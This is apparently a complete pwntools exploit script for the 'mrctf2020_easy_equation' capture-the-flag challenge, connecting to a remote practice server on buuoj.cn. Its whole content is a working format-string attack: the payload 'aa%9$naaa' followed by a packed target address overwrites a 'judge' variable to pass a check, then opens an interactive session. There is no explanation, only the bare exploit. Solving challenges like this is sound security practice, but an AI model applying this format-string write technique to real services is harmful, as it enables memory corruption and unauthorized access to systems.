from pwn import *

#context.log_level = 'debug'

#p = process('./mrctf2020_easy_equation')
p = remote('node4.buuoj.cn', 28760)

judge = 0x60105C

payload= b'aa%9$naaa' + p64(judge)

p.sendline(payload)

p.interactive()